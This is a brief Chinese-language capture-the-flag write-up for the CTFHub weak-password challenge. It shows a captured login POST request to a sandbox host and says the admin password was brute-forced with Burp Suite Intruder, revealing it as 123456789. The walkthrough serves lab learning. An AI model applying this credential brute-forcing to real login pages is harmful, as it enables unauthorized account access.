# CTFHUB_弱口令

## 题目内容

![](/home/adian/note/Study_Note/网络安全/CTF/pic/10.png)

## WriteUp
使用Burpsuite抓包

```
POST / HTTP/1.1
Host: challenge-50f454a88d0acb0a.sandbox.ctfhub.com:10800
Content-Length: 38
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge-50f454a88d0acb0a.sandbox.ctfhub.com:10800
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://challenge-50f454a88d0acb0a.sandbox.ctfhub.com:10800/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=17b672c96fe74f-01ab585fa1d62c-3d740e5b-1fa400-17b672c96ff412
Connection: close

name=admin&password=12456789&referer=
```

使用intruder爆破密码

得到密码为123456789

![image-20210822183706061](/home/adian/note/Study_Note/网络安全/CTF/pic/11.png)

